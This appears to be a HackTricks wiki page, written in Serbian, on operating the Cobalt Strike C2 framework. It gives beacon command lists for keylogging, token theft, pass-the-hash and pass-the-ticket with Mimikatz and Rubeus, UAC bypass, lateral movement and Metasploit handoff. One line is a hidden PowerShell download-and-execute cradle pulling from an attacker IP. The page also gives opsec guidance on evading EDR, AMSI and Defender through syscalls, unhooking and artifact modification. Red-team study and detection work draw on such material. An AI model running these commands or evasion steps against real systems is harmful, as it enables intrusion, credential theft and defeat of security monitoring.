# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeneri

### C2 Listeneri

`Cobalt Strike -> Listeners -> Add/Edit` zatim možete izabrati gde će se osluškivati, koju vrstu beacon-a koristiti (http, dns, smb...) i još mnogo toga.

### Peer2Peer Listeneri

Beacon-i ovih listenera ne moraju direktno da komuniciraju sa C2; mogu komunicirati sa njim preko drugih beacon-a.

`Cobalt Strike -> Listeners -> Add/Edit` zatim morate izabrati TCP ili SMB beacon-e.

* **TCP beacon će postaviti listener na izabranom portu**. Da biste se povezali sa TCP beacon-om, iz drugog beacon-a koristite komandu `connect <ip> <port>`
* **SMB beacon će osluškivati na pipename-u sa izabranim nazivom**. Da biste se povezali sa SMB beacon-om, morate koristiti komandu `link [target] [pipe]`.

### Generisanje i hostovanje payloads

#### Generisanje payloads u datotekama

`Attacks -> Packages ->`

* **`HTMLApplication`** za HTA datoteke
* **`MS Office Macro`** za Office dokument sa macro-om
* **`Windows Executable`** za .exe, .dll ili service .exe
* **`Windows Executable (S)`** za **stageless** .exe, .dll ili service .exe (stageless je bolji od staged, jer stvara manje IoC-ova)

#### Generisanje i hostovanje payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati skriptu/izvršnu datoteku za preuzimanje beacon-a sa Cobalt Strike-a u formatima kao što su: bitsadmin, exe, powershell i python.

#### Hostovanje payloads

Ako već imate datoteku koju želite da hostujete na web serveru, idite na `Attacks -> Web Drive-by -> Host File` i izaberite datoteku za hostovanje i konfiguraciju web servera.

### Opcije beacon-a

<details>
<summary>Opcije i komande beacon-a</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent mora samo da komunicira koristeći HTTP/S protokol Cobalt Strike Team Server-a (podrazumevani malleable C2 profile) da bi se registrovao/proverio i primao zadatke. Implementirajte iste URI-je/headers/metadata crypto definisane u profile-u kako biste ponovo koristili Cobalt Strike UI za tasking i output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (npr. `CustomBeacon.cna`) može da obuhvati generisanje payload-a za non-Windows beacon, tako da operatori mogu da izaberu listener i direktno iz GUI-ja generišu ELF payload-e.
- Primer Linux task handler-a izloženih Team Server-u: `sleep`, `cd`, `pwd`, `shell` (izvršavanje proizvoljnih komandi), `ls`, `upload`, `download` i `exit`. Oni se mapiraju na task ID-jeve koje Team Server očekuje i moraju biti implementirani na server-side-u da bi vraćali output u odgovarajućem formatu.
- BOF support na Linux-u može se dodati učitavanjem Beacon Object Files u isti proces pomoću [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (podržava i Outflank-style BOF-ove), što omogućava da se modularni post-exploitation izvršava u context-u/privilegijama implant-a bez pokretanja novih procesa.<sup>[[2]](#references)[[3]](#references)</sup>
- Ugradite SOCKS handler u custom beacon da biste zadržali pivoting parity sa Windows Beacon-ima: kada operator pokrene `socks <port>`, implant treba da otvori lokalni proxy za rutiranje operator tool-ova kroz kompromitovani Linux host ka internim mrežama.

## Opsec

### Execute-Assembly

**`execute-assembly`** koristi **sacrificial process** pomoću remote process injection-a za izvršavanje navedenog programa. Ovo je veoma upadljivo, jer se za injection unutar procesa koriste određeni Win API-ji koje svaki EDR proverava. Međutim, postoje neki custom tool-ovi koji se mogu koristiti za učitavanje nečega u isti proces:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- U Cobalt Strike-u možete koristiti i BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` kreira komandu `helpx` u Cobalt Strike-u, koja će dodati boje komandama i označiti da li su BOF-ovi (zeleno), Frok&Run (žuto) i slično, ili su ProcessExecution, injection ili slično (crveno). To pomaže da se utvrdi koje su komande stealthy.

### Delujte kao korisnik

Možete proveriti događaje kao što su `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Proverite sve interactive logon-e da biste utvrdili uobičajeno radno vreme.
- System EID 12,13 - Proverite učestalost shutdown/startup/sleep događaja.
- Security EID 4624/4625 - Proverite dolazne valid/invalid NTLM pokušaje.
- Security EID 4648 - Ovaj događaj se kreira kada se plaintext credentials koriste za logon. Ako ga je generisao proces, binary potencijalno sadrži credentials u clear text-u u config file-u ili unutar koda.

Kada koristite `jump` iz Cobalt Strike-a, bolje je koristiti `wmi_msbuild` method kako bi novi proces izgledao legitimnije.

### Koristite computer accounts

Uobičajeno je da defenders proveravaju neobična ponašanja koja generišu user-i i **isključuju service accounts i computer accounts poput `*$` iz svog monitoring-a**. Ove account-e možete koristiti za lateral movement ili privilege escalation.

### Koristite stageless payload-e

Stageless payload-i su manje upadljivi od staged payload-a jer ne moraju da preuzimaju second stage sa C2 server-a. To znači da ne generišu network traffic nakon inicijalne konekcije, zbog čega je manja verovatnoća da će ih detektovati network-based defenses.

### Tokens & Token Store

Budite pažljivi prilikom krađe ili generisanja token-a, jer EDR može enumerisati thread token-e i detektovati **token koji pripada drugom user-u** ili čak SYSTEM-u unutar procesa.

Ovo omogućava čuvanje token-a **po beacon-u**, tako da nije potrebno krasti isti token iznova. Ovo je korisno za lateral movement ili kada je potrebno više puta koristiti ukradeni token:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Prilikom lateral movement-a obično je bolje **ukrasti token nego generisati novi** ili izvršiti pass the hash attack.

### Guardrails

Cobalt Strike ima funkciju pod nazivom **Guardrails**, koja pomaže u sprečavanju korišćenja određenih komandi ili akcija koje bi defenders mogli da detektuju. Guardrails se mogu konfigurisati tako da blokiraju određene komande, kao što su `make_token`, `jump`, `remote-exec` i druge koje se često koriste za lateral movement ili privilege escalation.

Pored toga, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) takođe sadrži određene provere i ideje koje možete razmotriti pre izvršavanja payload-a.

### Tickets encryption

U AD-u budite pažljivi sa encryption-om ticket-a. Po podrazumevanim podešavanjima, neki tool-ovi će koristiti RC4 encryption za Kerberos ticket-e, koji je manje bezbedan od AES encryption-a, dok će up-to-date environment-i podrazumevano koristiti AES. Defenders koji nadgledaju slabe encryption algoritme mogu ovo detektovati.

### Izbegavajte Defaults

Kada koristite Cobalt Stricke, SMB pipes će podrazumevano imati imena `msagent_####` i `"status_####"`. Promenite ta imena. Imena postojećih pipe-ova iz Cobal Strike-a možete proveriti komandom: `ls \\.\pipe\`

Pored toga, sa SSH session-ima kreira se pipe pod nazivom `\\.\pipe\postex_ssh_####`. Promenite ga pomoću `set ssh_pipename "<new_name>";`.

Takođe, u poext exploitation attack-u pipe-ovi `\\.\pipe\postex_####` mogu da se izmene pomoću `set pipename "<new_name>"`.

U Cobalt Strike profile-ima možete izmeniti i sledeće:

- Izbegavanje korišćenja `rwx`
- Način na koji funkcioniše process injection behavior (koji API-ji će se koristiti) u bloku `process-inject {...}`
- Način na koji funkcioniše "fork and run" u bloku `post-ex {…}`
- Vreme sleep-a
- Maksimalnu veličinu binary-ja koji se učitavaju u memory
- Memory footprint i DLL content pomoću `stage {...}` bloka
- Network traffic

### Zaobiđite memory scanning

Neki ERD-ovi skeniraju memory u potrazi za poznatim malware signatures. Coblat Strike omogućava izmenu `sleep_mask` funkcije u BOF koji može da encrypt-uje backdoor u memory-ju.

### Noisy proc injections

Kada se code inject-uje u proces, to je obično veoma upadljivo, zato što **nijedan regularni proces obično ne izvršava ovu akciju i zato što su načini za njeno izvršavanje veoma ograničeni**. Zbog toga ga mogu detektovati behaviour-based detection systems. Takođe, EDR-ovi ga mogu detektovati skeniranjem network-a u potrazi za **thread-ovima koji sadrže code koji ne postoji na disk-u** (iako procesi poput browser-a koji koriste JIT ovo često rade). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID i PPID odnosi

Prilikom spawn-ovanja novog procesa važno je **održati uobičajen parent-child** odnos između procesa kako bi se izbegla detekcija. Ako svchost.exec izvršava iexplorer.exe, to će izgledati sumnjivo, jer svchost.exe nije parent iexplorer.exe procesa u normalnom Windows environment-u.

Kada se novi beacon spawn-uje u Cobalt Strike-u, podrazumevano se kreira proces koji koristi **`rundll32.exe`** za pokretanje novog listener-a. Ovo nije naročito stealthy i EDR-ovi ga mogu lako detektovati. Pored toga, `rundll32.exe` se pokreće bez argumenata, što ga čini još sumnjivijim.

Pomoću sledeće Cobalt Strike komande možete navesti drugi proces za spawn-ovanje novog beacon-a, čime će on biti teže detektovati:
```bash
spawnto x86 svchost.exe
```
Možete takođe promeniti ovo podešavanje **`spawnto_x86` i `spawnto_x64`** u profilu.

### Proksiranje saobraćaja napadača

Napadači će ponekad morati da mogu lokalno da pokreću alate, čak i na Linux mašinama, i da omoguće da saobraćaj žrtava stigne do alata (npr. NTLM relay).

Pored toga, ponekad je tokom napada pass-the-hash ili pass-the-ticket stealthier da napadač **doda ovaj hash ili ticket u sopstveni LSASS proces** lokalno, a zatim izvrši pivot iz njega, umesto da menja LSASS proces na mašini žrtve.

Međutim, morate biti **pažljivi sa generisanim saobraćajem**, jer biste mogli da šaljete neuobičajen saobraćaj (Kerberos?) iz svog backdoor procesa. U tu svrhu možete izvršiti pivot ka browser procesu (iako biste mogli biti uhvaćeni tokom injektovanja u proces, pa razmislite o stealth načinu za to).


### Izbegavanje AV-ova

#### AV/AMSI/ETW Bypass

Pogledajte stranicu:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i prekompajlirane template-e (u `/src-common`) payload-a koje Cobalt Strike koristi za generisanje binarnih beacon-a.

Korišćenjem alata [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoor-om (ili samo sa kompajliranim template-om) možete pronaći šta uzrokuje da Defender reaguje. To je obično string. Zato možete samo izmeniti kod koji generiše backdoor tako da se taj string ne pojavi u konačnom binarnom fajlu.

Nakon izmene koda samo pokrenite `./build.sh` iz istog direktorijuma i kopirajte folder `dist-pipe/` na Windows klijent u `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Ne zaboravite da učitate agresivnu skriptu `dist-pipe\artifact.cna` kako biste naznačili Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne učitane resurse.

#### Resource Kit

Fascikla ResourceKit sadrži šablone za Cobalt Strike payload-e zasnovane na skriptama, uključujući PowerShell, VBA i HTA.

Korišćenjem alata [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa šablonima možete utvrditi šta Defender-u (u ovom slučaju AMSI-ju) smeta i izmeniti to:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Izmenom detektovanih linija može se generisati template koji neće biti uhvaćen.

Ne zaboravite da učitate agresivnu skriptu `ResourceKit\resources.cna` kako biste naznačili Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne one koji su učitani.

#### Function hooks | Syscall

Function hooking je veoma čest metod koji ERD-ovi koriste za detekciju zlonamerne aktivnosti. Cobalt Strike omogućava zaobilaženje ovih hook-ova korišćenjem **syscalls** umesto standardnih Windows API poziva pomoću konfiguracije **`None`**, korišćenjem `Nt*` verzije funkcije sa podešavanjem **`Direct`**, ili jednostavnim preskakanjem `Nt*` funkcije pomoću opcije **`Indirect`** u malleable profilu. U zavisnosti od sistema, jedna opcija može biti stealth u odnosu na drugu.

Ovo se može podesiti u profilu ili pomoću komande **`syscall-method`**

Međutim, ovo takođe može biti noisy.

Jedna od opcija koju Cobalt Strike pruža za zaobilaženje function hook-ova jeste uklanjanje tih hook-ova pomoću: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Takođe možete proveriti koje funkcije imaju hook-ove pomoću [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ili [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Razne Cobalt Strike komande</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (prilagođeni implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader i Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42 analiza enkripcije metapodataka za Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC dnevnik o Cobalt Strike saobraćaju](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
